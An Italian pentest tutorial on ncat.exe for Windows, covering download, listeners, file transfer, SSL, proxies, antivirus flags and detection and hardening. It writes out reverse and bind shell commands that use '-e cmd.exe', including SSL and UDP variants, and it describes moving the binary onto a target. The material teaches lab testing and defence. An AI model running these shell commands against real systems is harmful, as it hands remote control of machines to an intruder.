---
title: 'Ncat.exe su Windows: Download, Comandi e Reverse Shell'
slug: ncat-exe
description: 'Come scaricare e usare ncat.exe su Windows: listener, connessioni, trasferimento file, SSL, reverse shell con -e cmd.exe, falsi positivi antivirus e detection.'
image: /ncat-exe-windows-networking-netcat-hackita.webp
draft: false
date: 2026-02-19T00:00:00.000Z
categories:
  - tools
subcategories:
  - enum
tags:
  - ncat.exe
  - ncat windows
  - nc.exe
  - ncat ssl
---

# Ncat.exe: Consigli,Pentest e Segreti Per Netcat su Windows

`ncat.exe` è la versione Windows di Ncat, il "netcat moderno" del progetto Nmap. Su Windows è il modo più semplice per avere un listener, un client TCP/UDP, un trasferimento file o una reverse shell con supporto a SSL, proxy e controllo degli accessi.

La guida è pensata per lab, CTF e pentest autorizzati. Se cerchi la teoria su `nc` in generale e sulle differenze tra le varianti, leggi prima [Netcat: guida pratica](https://hackita.it/articoli/netcat/).

## Comandi Essenziali

| Obiettivo                              | Comando                                           |
| -------------------------------------- | ------------------------------------------------- |
| Verificare che funzioni                | `ncat.exe --version`                              |
| Listener TCP                           | `ncat.exe -lvn 4444`                              |
| Connettersi a un servizio              | `ncat.exe 10.10.10.5 80`                          |
| Testare una porta (senza inviare dati) | `ncat.exe -zv 10.10.10.5 445`                     |
| Ricevere un file                       | `ncat.exe -lvn 9000 --recv-only > file.bin`       |
| Inviare un file                        | `ncat.exe 10.10.10.5 9000 --send-only < file.bin` |
| Reverse shell (client)                 | `ncat.exe ATTACKER 4444 -e cmd.exe`               |
| Bind shell limitata a un IP            | `ncat.exe -lvn 4444 -e cmd.exe --allow ATTACKER`  |
| Listener cifrato                       | `ncat.exe -lvn 4444 --ssl`                        |
| Client cifrato                         | `ncat.exe --ssl 10.10.10.5 4444`                  |

## Cos'è Ncat.exe e Differenza con nc.exe

Ncat è stato scritto per il progetto Nmap come reimplementazione moderna di Netcat. `nc.exe` è invece la vecchia porta Windows del Netcat originale, ancora presente in molti lab.

|                        | `ncat.exe`                            | `nc.exe` (vecchio)              |
| ---------------------- | ------------------------------------- | ------------------------------- |
| Origine                | Progetto Nmap                         | Porta Windows del Netcat 1.x    |
| SSL/TLS                | Sì (`--ssl`)                          | No                              |
| Proxy (SOCKS4/5, HTTP) | Sì                                    | No                              |
| Controllo accessi      | `--allow`, `--deny`                   | No                              |
| Esecuzione comandi     | `-e`, `-c` / `--sh-exec`              | `-e`                            |
| Manutenzione           | Attivo, distribuito con Nmap          | Datato                          |
| Windows supportato     | Windows 7 e successivi (Nmap attuale) | Anche sistemi molto vecchi (XP) |

Se ti serve un target molto vecchio (Windows XP) la scelta è `nc.exe`. Per tutto il resto usa `ncat.exe`.

## Scaricare e Installare Ncat su Windows

`ncat.exe` non è incluso in Windows: arriva con Nmap.

**Opzione 1: installer ufficiale.** Scarica l'installer Windows dalla [pagina download di Nmap](https://nmap.org/download.html). Installa anche Npcap. Il file `ncat.exe` finisce nella cartella di installazione di Nmap.

**Opzione 2: winget.**

```powershell
winget install Insecure.Nmap
```

Controlla poi dove si trova:

```powershell
Get-Command ncat.exe
# se non è nel PATH:
dir "C:\Program Files (x86)\Nmap\ncat.exe"
```

**Opzione 3: portare solo `ncat.exe` su un'altra macchina del lab.** Copia l'intera cartella di Nmap o almeno `ncat.exe` con le DLL presenti accanto, poi prova `ncat.exe --version`: alcune build richiedono le librerie incluse. Per il trasferimento file sul target puoi usare [PowerShell](https://hackita.it/articoli/powershell/) o [certutil](https://hackita.it/articoli/certutilexe/), come spiegato nella guida ai [LOLBins](https://hackita.it/articoli/lolbins/).

### Verifica l'integrità

Scarica solo da nmap.org. Nmap pubblica firme GPG e hash per ogni release. Per calcolare l'hash localmente:

```powershell
Get-FileHash .\ncat.exe -Algorithm SHA256
```

Confrontalo con quello della fonte ufficiale: una copia trovata su siti terzi può essere modificata.

## Sintassi Base

```
ncat.exe [opzioni] [host] [porta]
```

| Opzione                       | Funzione                                             |
| ----------------------------- | ---------------------------------------------------- |
| `-l`                          | Modalità listener                                    |
| `-k`                          | Listener che accetta più connessioni                 |
| `-v` / `-vv`                  | Output verboso                                       |
| `-n`                          | Nessuna risoluzione DNS                              |
| `-u`                          | UDP invece di TCP                                    |
| `-z`                          | Solo controllo della connessione, senza inviare dati |
| `-w`                          | Timeout di connessione                               |
| `-i`                          | Chiude la connessione dopo un periodo di inattività  |
| `-e <cmd>`                    | Esegue un comando alla connessione                   |
| `-c <cmd>` / `--sh-exec`      | Come `-e`, tramite shell                             |
| `--ssl`                       | Usa SSL/TLS                                          |
| `--allow` / `--deny`          | Filtro per host                                      |
| `--send-only` / `--recv-only` | Solo invio / solo ricezione                          |
| `-C`                          | Converte gli a capo in CRLF                          |

Per i tempi usa unità esplicite: `-w 5s`, `-i 30s`.

## Listener e Connessioni

Apri un listener sulla porta 4444:

```powershell
ncat.exe -lvn 4444
```

Dall'altra macchina connettiti:

```bash
nc 10.10.10.20 4444
```

Per accettare più connessioni di seguito usa `-k`:

```powershell
ncat.exe -lvnk 4444
```

Il primo avvio può far comparire il prompt di **Windows Firewall**: serve una regola in ingresso per quella porta, altrimenti il listener resta raggiungibile solo in locale.

### Test di una porta

```powershell
ncat.exe -zv 10.10.10.5 445
```

Per un semplice test, senza ncat, PowerShell basta:

```powershell
Test-NetConnection 10.10.10.5 -Port 445
```

Per scansioni vere usa [Nmap](https://hackita.it/articoli/nmap/): Ncat serve per verifiche puntuali, non per scansionare reti.

### Banner grabbing HTTP

```powershell
"GET / HTTP/1.1`r`nHost: sito.lab`r`nConnection: close`r`n`r`n" | ncat.exe sito.lab 80
```

L'intestazione `Host` è importante sui server virtuali, e `` `r`n `` produce i terminatori corretti in PowerShell.

## Trasferimento File

Sul ricevente:

```powershell
ncat.exe -lvn 9000 --recv-only > backup.zip
```

Sul mittente:

```powershell
ncat.exe 10.10.10.20 9000 --send-only < backup.zip
```

Con `--send-only` il mittente chiude la connessione alla fine del file, senza restare appeso. Controlla l'integrità alla fine, perché il trasferimento non è cifrato né verificato:

```powershell
Get-FileHash backup.zip -Algorithm SHA256
```

**Nota PowerShell:** il redirect `<` non è supportato in Windows PowerShell. Da PowerShell usa `cmd /c`:

```powershell
cmd /c "ncat.exe 10.10.10.20 9000 --send-only < backup.zip"
```

Per trasferimenti cifrati vedi la sezione SSL. Per un server SMB temporaneo, guarda [smbserver](https://hackita.it/articoli/smbserver/).

## Reverse Shell e Bind Shell su Windows

Il flag `-e` esegue un programma e collega input/output al socket.

**Reverse shell** (il target si connette a te). Sul tuo host (Kali):

```bash
nc -lvnp 4444
```

Sul target Windows del lab:

```powershell
ncat.exe 10.10.14.5 4444 -e cmd.exe
```

**Bind shell** (il target resta in ascolto):

```powershell
ncat.exe -lvn 4444 -e cmd.exe --allow 10.10.14.5
```

Con `--allow` accetti solo il tuo IP. Senza, chiunque raggiunga la porta ottiene una shell.

Il vantaggio rispetto ad altre tecniche è che non servono payload: serve però già avere esecuzione di comandi sul target (vedi [RCE](https://hackita.it/articoli/rce/)) e poter scrivere `ncat.exe` sul disco. In un test reale, la shell ottenuta è l'inizio della [post-exploitation](https://hackita.it/articoli/post-exploitation/); in alternativa a un `ncat.exe` portato a mano, esistono framework come [Metasploit](https://hackita.it/articoli/metasploit/).

**Reverse shell cifrata** (Ncat su entrambi i lati). Sul tuo host:

```bash
ncat --ssl -lvn 4444
```

Sul target:

```powershell
ncat.exe --ssl 10.10.14.5 4444 -e cmd.exe
```

**Reverse shell su UDP.** Ncat supporta anche `-u`, utile quando il TCP in uscita è filtrato ma l'UDP no. Il listener va aperto in UDP:

```bash
ncat -u -lvn 4444
```

```powershell
ncat.exe -u 10.10.14.5 4444 -e cmd.exe
```

**Binari e alternative.**

* Su Kali trovi `nc.exe` (non `ncat.exe`) nel pacchetto `windows-resources`, in `/usr/share/windows-resources/binaries/`.
* `sbd.exe` è un'alternativa a Netcat con cifratura inclusa.
* Se `ncat.exe` non è disponibile, una reverse shell in PowerShell con `System.Net.Sockets.TCPClient` fa lo stesso lavoro senza file aggiuntivi: nei lab è spesso la prima scelta, perché usa uno strumento nativo.

La shell è grezza (niente cronologia, niente TTY). Per una shell Windows completamente interattiva esiste ConPtyShell, che richiede Windows 10 / Server 2019 (build 1809) o successivi.

## Ncat.exe con SSL/TLS

Questa è la differenza più utile rispetto a `nc.exe`: il traffico non è leggibile in chiaro.

**Listener:**

```powershell
ncat.exe -lvn 4444 --ssl
```

Se non fornisci un certificato, Ncat ne genera uno temporaneo. Per usarne uno tuo:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30
```

```powershell
ncat.exe -lvn 4444 --ssl --ssl-cert cert.pem --ssl-key key.pem
```

**Client:**

```powershell
ncat.exe --ssl 10.10.10.20 4444
```

Con `--ssl-verify` il client verifica anche il certificato. Senza, la connessione è cifrata ma non autenticata: non protegge da un man-in-the-middle. Per approfondire, vedi [TLS/SSL](https://hackita.it/articoli/tls-ssl/) e [OpenSSL](https://hackita.it/articoli/openssl/).

## Proxy, Broker e Chat

* `--proxy host:porta --proxy-type socks5` fa passare la connessione da un proxy (SOCKS4/5 o HTTP). Utile con strumenti come [Proxychains](https://hackita.it/articoli/proxychains/) e nel [pivoting](https://hackita.it/articoli/pivoting/).
* `--broker` permette a più client di comunicare tramite il listener.
* `--chat` è un broker con identificatore per ogni client.

```powershell
ncat.exe -lvn 4444 --chat
```

## Ncat.exe Segnalato dall'Antivirus

È normale. `ncat.exe` viene spesso classificato come strumento "hack tool", "riskware" o "potentially unwanted program" da antivirus ed EDR (anche Symantec), perché è molto usato nelle intrusioni. Questo non significa che il file ufficiale sia infetto.

Cosa fare:

1. Verifica che l'hash coincida con quello ufficiale.
2. Nel lab: aggiungi un'eccezione o usa una VM dedicata.
3. In un engagement reale: non aggirare i controlli. Concorda con il cliente l'esecuzione e la gestione degli alert.

Al contrario, se trovi `ncat.exe` su un server dove non dovrebbe esserci, è un indicatore da investigare.

## Detection e Hardening

| Segnale                                            | Dove guardarlo                            |
| -------------------------------------------------- | ----------------------------------------- |
| Processo `ncat.exe` o `nc.exe`                     | Creazione processi (Event 4688, Sysmon 1) |
| Riga di comando con `-e`, `-c`, `--sh-exec`, `-l`  | Command line del processo                 |
| `ncat.exe` che genera `cmd.exe` o `powershell.exe` | Relazione padre-figlio nei log            |
| Connessione in uscita o porta in ascolto anomala   | Sysmon 3 e `Get-NetTCPConnection`         |
| File con nome simile in cartelle utente o `Temp`   | EDR e controllo file                      |

Per trovare i listener e il processo proprietario:

```powershell
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess
Get-Process -Id <PID> | Select Name,Path
```

Attenzione: un attaccante può rinominare il binario, quindi cerca il comportamento (porta in ascolto, comando lanciato, connessioni), non solo il nome. Per l'hardening usa AppLocker o WDAC per limitare i binari consentiti, filtri in uscita sul [firewall](https://hackita.it/articoli/firewall/) e rimuovi gli strumenti non necessari. Per l'analisi del traffico vedi [Wireshark](https://hackita.it/articoli/wireshark/).

## Risoluzione dei Problemi

| Problema                          | Causa probabile                                  | Cosa fare                              |
| --------------------------------- | ------------------------------------------------ | -------------------------------------- |
| `ncat.exe` non riconosciuto       | Non nel PATH                                     | Usa il percorso completo               |
| File sparito subito dopo la copia | Antivirus                                        | Vedi sezione dedicata                  |
| Il listener non è raggiungibile   | Windows Firewall                                 | Regola in ingresso sulla porta         |
| `-e cmd.exe` non risponde         | Connessione filtrata o `-e` bloccato             | Verifica rete e log, prova `-c`        |
| `<` non funziona in PowerShell    | Redirect non supportato                          | Usa `cmd /c "..."`                     |
| `Ncat: bind to ... failed`        | Porta già in uso                                 | `netstat -ano` per trovare il processo |
| Errore SSL                        | Certificato non valido o `--ssl` solo da un lato | Usa `--ssl` su entrambi i lati         |

## Checklist

* Download solo da nmap.org e hash verificato
* Firewall e porta controllati prima del listener
* `--allow` su ogni bind shell
* `--ssl` quando il traffico non deve essere in chiaro
* Controllo dell'hash dopo ogni trasferimento file
* Detection verificata nei log del lab

## FAQ

**Dove si scarica ncat.exe?**
Da nmap.org, insieme a Nmap. Non è incluso in Windows.

**Qual è la differenza tra Ncat e Netcat?**
Ncat è la versione del progetto Nmap, con SSL, proxy e controllo accessi. Per le differenze tra tutte le varianti: [guida a Netcat](https://hackita.it/articoli/netcat/).

**Ncat funziona su Windows 7 e versioni recenti?**
Nmap attuale supporta Windows 7 e successivi. Per sistemi più vecchi servono versioni datate o `nc.exe`.

**Perché l'antivirus blocca ncat.exe?**
Perché è uno strumento a doppio uso. Verifica l'hash e gestisci l'eccezione solo in un contesto autorizzato.

**Posso usare PowerShell al posto di ncat?**
Per test di porta sì (`Test-NetConnection`). Per listener e shell servono script o strumenti più complessi: ncat è molto più semplice.

**Ncat cifra il traffico?**
Solo con `--ssl`. Senza, tutto viaggia in chiaro.

**È legale?**
Usalo solo su sistemi tuoi, con autorizzazione scritta, o in lab dedicati.

## Risorse

* [Ncat Reference Guide (Nmap)](https://nmap.org/book/ncat-man.html)
* [Download Nmap per Windows](https://nmap.org/download.html)
